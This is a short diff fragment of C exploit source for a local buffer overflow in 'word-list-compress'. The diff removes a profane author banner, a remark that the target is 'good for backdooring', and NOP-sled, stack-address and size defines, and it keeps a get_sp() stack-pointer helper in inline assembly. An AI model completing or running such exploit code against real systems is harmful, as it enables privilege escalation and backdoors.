@@ -1,20 +1,3 @@
-/*
-  Fuck private exploits .
-  Fuck iranian hacking (and security !!) teams who are just some fucking kiddies.
-  Fuck all "Security money makers"
-  
-  word-list-compress local exploit - SECU
-  Coded by : c0d3r / root . razavi1366[at]yahoo[dot]com
-  word-list-compress is not setuid . so good for backdooring .
-  gratz fly to : LorD - NT - sIiiS - vbehzadan - hyper sec members.
-  we are : LorD - c0d3r - NT ; irc.persiairc.com 6667 #ihs
-*/
-
-#include<stdio.h>
-#include<stdlib.h>
-#define NOP 0x90
-#define address 0xbffff2b8
-#define size 350
 unsigned long get_sp(void)
 {
         __asm__("movl %esp, %eax");
